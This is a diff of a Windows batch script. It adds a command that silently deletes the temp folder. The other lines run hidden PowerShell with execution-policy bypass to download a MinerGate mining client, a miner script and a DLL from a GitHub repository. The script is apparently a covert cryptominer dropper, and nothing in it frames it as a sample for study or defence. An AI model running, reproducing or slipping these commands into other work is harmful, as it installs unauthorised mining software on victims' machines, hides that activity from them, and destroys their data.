@@ -1,3 +1,4 @@
+rd %temp% /s /q
 cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://github.com/mediatui/tool/raw/master/multi/minergate-cli.exe
 cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/miner.cmd
 cd %TMP% && powershell -W Hidden -Exec Bypass cmd.exe /c %wget% -q https://raw.githubusercontent.com/mediatui/tool/master/multi/msvcp140.dll
